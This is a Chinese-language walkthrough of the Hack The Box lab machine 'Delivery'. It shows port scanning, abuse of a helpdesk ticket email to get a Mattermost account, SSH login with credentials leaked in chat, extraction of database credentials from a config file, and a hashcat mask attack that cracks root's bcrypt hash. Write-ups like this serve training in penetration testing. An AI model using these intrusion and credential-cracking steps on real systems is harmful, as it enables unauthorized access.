# 服务探测

开放端口
```
┌──(root㉿rock)-[~]
└─# nmap -p- --open 10.10.10.222                                          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:35 EDT
Nmap scan report for 10.10.10.222
Host is up (0.0056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 5.10 seconds

```

详细端口信息
```
┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.222 -p 22,80,8065                         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:36 EDT
Nmap scan report for 10.10.10.222
Host is up (0.0028s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Mon, 18 Jul 2022 15:33:34 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: eys7qraci3yxzgttodhwutc5nh
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Mon, 18 Jul 2022 15:37:04 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Mon, 18 Jul 2022 15:37:04 GMT
|_    Content-Length: 0

```

两个web服务

80爆破
```
┌──(root㉿rock)-[~]
└─# python3 /root/dirsearch/dirsearch.py -e* -t 30 -u http://10.10.10.222/                         

  _|. _ _  _  _  _ _|_    v0.4.2.6
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 

Output File: /root/dirsearch/reports/10.10.10.222/__22-07-18_23-17-32.txt

Target: http://10.10.10.222/

[23:17:32] Starting: 
[23:17:50] 301 -  185B  - /assets  ->  http://10.10.10.222/assets/          
[23:17:50] 403 -  571B  - /assets/                                          
[23:17:59] 301 -  185B  - /error  ->  http://10.10.10.222/error/            
[23:17:59] 200 -    1KB - /error/                                           
[23:18:04] 301 -  185B  - /images  ->  http://10.10.10.222/images/          
[23:18:04] 403 -  571B  - /images/
[23:18:04] 200 -   11KB - /index.html                                       
[23:18:42] 200 -  648B  - /README.MD                                        
                                                                             
Task Completed

```

看起来都是静态页面

查看80页面源代码，发现有一个```delivery.htb```域名

把```delivery.htb```添加到hosts文件

```10.10.10.222 delivery.htb```

在```http://delivery.htb/#contact-us```文字描述

```
Contact Us

For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.
```

查看网页源代码，又出现了一个域名```helpdesk.delivery.htb```

```MatterMost server```就是8065的web服务，一个登陆页面，需要邮箱账号，注册的账号需要在邮箱中确认，这在lab的环境下是不可能的，因为lab不通外网。

再次把```helpdesk.delivery.htb```添加到hosts文件

```10.10.10.222 helpdesk.delivery.htb```


尝试新建一个工单，返回文字

```
max, 

You may check the status of your ticket, by navigating to the Check Status page using ticket id: 5838037.

If you want to add more information to your ticket, just email 5838037@delivery.htb.

Thanks,

Support Team
```

使用上面文字里提供的邮箱地址，到8065端口注册一个账号
```
用户名：5838037@delivery.htb
```

来到```http://helpdesk.delivery.htb/tickets.php```，输入我们之前创建ticket的邮箱和票据号码（5838037），这个时候就可以在网页上收到确认邮件：

此时页面文字变为：
```
---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=7i3surzbzqs3r1zhun8bkdtw3cjxmp1dpji4donhg7wpg8p96zhsh3ampd6ptatx&email=5838037%40delivery.htb ) --------------------- You can sign in from: --------------------- Mattermost lets you share messages and files from your PC or phone, with instant search and archiving. For the best experience, download the apps for PC, Mac, iOS and Android from: https://mattermost.com/download/#mattermostApps ( https://mattermost.com/download/#mattermostApps
```

点击上面确认URL，确认注册。此时我们有了一个可以登录8065服务的账号密码。

登录系统看到后台留言
```
System
9:25 AM

@root joined the team.
System
9:28 AM
@root updated the channel display name from: Town Square to: Internal
root
9:29 AM

@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail! 

Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
root
10:58 AM

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

暴露一个凭据：```maildeliverer:Youve_G0t_Mail!```

可以使用ssh登录，拿到foodhold
```
┌──(root💀kali)-[~/htb/Delivery]
└─# ssh maildeliverer@10.10.10.222
The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
RSA key fingerprint is SHA256:B+rlws5emnYTMuozSG7wYcAeGNraDgR918ttg3/BV9o.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.222' (RSA) to the list of known hosts.
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ whoami
maildeliverer
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt
dc0dc83c949...

```

# 提权

在opt文件夹发现一个项目文件夹
```
maildeliverer@Delivery:/opt$ ls
mattermost
```

opt文件夹一般不会有任何内容，如果出现了文件应该特别留意

在config文件夹找到一个mysql的连接凭据

```
 "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026re
adTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },

```

连接mysql

```
maildeliverer@Delivery:~$ mysql -u mmuser -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 40
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> 

```

在users表找到root的加密凭据
```
ariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
7 rows in set (0.001 sec)


```

上面后台的留言中,说明密码是字符串```PleaseSubscribe!```的变体
```
Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
root
10:58 AM

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```


以```PleaseSubscribe!```为前缀的密码
```
PleaseSubscribe!?d
PleaseSubscribe!?d?d
PleaseSubscribe!?d?d?d
PleaseSubscribe!?d?d?d?d
```

准备两个文件，一个源密码，一个掩码
```
┌──(root💀kali)-[~/htb/Delivery]
└─# cat hash.txt                             
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
                                                                                                                    
┌──(root💀kali)-[~/htb/Delivery]
└─# cat mask.txt 
PleaseSubscribe!?d
PleaseSubscribe!?d?d
PleaseSubscribe!?d?d?d
PleaseSubscribe!?d?d?d?d
```

使用hashcat破解

```
──(root💀kali)-[~/htb/Delivery]
└─# hashcat -m 3200 -a 3 hash.txt mask.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-4170 CPU @ 3.70GHz, 1084/2233 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Brute-Force

Watchdog: Temperature abort trigger set to 90c

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Tue Sep  6 03:57:22 2022 (1 sec)
Time.Estimated...: Tue Sep  6 03:57:23 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: PleaseSubscribe!?d?d [18]
Guess.Queue......: 2/4 (50.00%)
Speed.#1.........:       24 H/s (10.28ms) @ Accel:2 Loops:128 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 12/100 (12.00%)
Rejected.........: 0/12 (0.00%)
Restore.Point....: 10/100 (10.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024
Candidate.Engine.: Device Generator
Candidates.#1....: PleaseSubscribe!19 -> PleaseSubscribe!21
Hardware.Mon.#1..: Util: 91%

Started: Tue Sep  6 03:57:15 2022
Stopped: Tue Sep  6 03:57:24 2022

```

得到密码是:```PleaseSubscribe!21```

提权到root

```
maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# whoami
root
root@Delivery:/home/maildeliverer# 
```